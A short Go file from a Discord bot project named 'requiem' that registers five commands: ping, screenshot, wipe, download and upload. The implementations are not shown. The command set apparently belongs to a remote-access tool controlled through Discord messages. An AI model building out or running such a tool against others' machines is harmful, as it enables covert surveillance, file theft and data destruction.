package bot

import (
	"requiem/bot/commands"

	"github.com/bwmarrin/discordgo"
)

type command interface {
	Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string)
	Name() string
	Info() string
}

var commandsList = make(map[string]command)

func registerCommands() {
	commandsList["ping"] = &commands.PingCommand{}
	commandsList["ss"] = &commands.ScreenshotCommand{}
	commandsList["wipe"] = &commands.WipeCommand{}
	commandsList["download"] = &commands.DownloadCommand{}
	commandsList["upload"] = &commands.UploadCommand{}
}
